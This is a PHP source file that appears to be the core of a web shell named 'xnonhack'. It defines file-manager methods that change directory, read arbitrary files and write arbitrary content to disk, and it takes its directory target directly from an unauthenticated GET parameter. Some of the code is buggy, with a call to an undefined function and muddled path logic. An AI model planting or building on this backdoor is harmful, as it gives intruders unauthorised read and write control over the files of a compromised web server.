<?php
class xnonhack {
    public function __construct(bool $debug = true, int $time = 0) {
        if ($debug === true) {
            error_reporting(E_ALL);
        } else {
            error_reporting($debug);
        }

        error_log($debug);
        set_time_limit($time);
        $this->cwd = getcwd() . DIRECTORY_SEPARATOR;
    }
    public function vars($x) {
        return print($x);
    }
    public function cwd() {
        return $this->cwd;
    }
    public function pwd($dir) {
        $path = explode(DIRECTORY_SEPARATOR, $this->cwd());
        foreach ($path as $key => $value) {
            for ($i=0; $i < $key ; $i++) { 
                print($path[$i]);
                if ($i != $key) {
                    print(DIRECTORY_SEPARATOR);
                }
            } return $value;
        }
    }
    public function cd(string $directory) {
        $this->cwd = $directory;
        chdir($this->cwd);
    }
    public function htmlchar($filename) {
        return htmlspecialchars(file_get_contents($filename));
    }
    public function save($filename, $text) {
        $this->handle = fopen($filename, "w");
        $this->text = $text;
        fwrite($this->handle, $this->text);
        fclose($this->handle);
    }
    public function getAllFiles($dir, &$output = array()) {
        foreach (scandir($dir) as $key => $value) {
            $location = $dir.DIRECTORY_SEPARATOR.$value;
            if (!is_dir($location)) {
                $output[] = $location;
            } elseif ($value != "." && $value != '..') {
                listFile($location, $output);
                $output[] = $location;
            }
        } return $output;
    }
    public function listFiles($output = array()) {
        foreach (scandir($this->cwd) as $key => $value) {
            $dir = $this->cwd.DIRECTORY_SEPARATOR.$value;
            $locate = str_replace('\\\\', DIRECTORY_SEPARATOR, $dir);
            if (!is_dir($locate)) {
                $output[] = $locate;
            } elseif (!is_file($locate)) {
                $output[] = $locate;
            }
        } return $output;
    }
}


$execute = new xnonhack();

if (isset($_GET['cd'])) {
    $execute->cd($_GET['cd']);
}
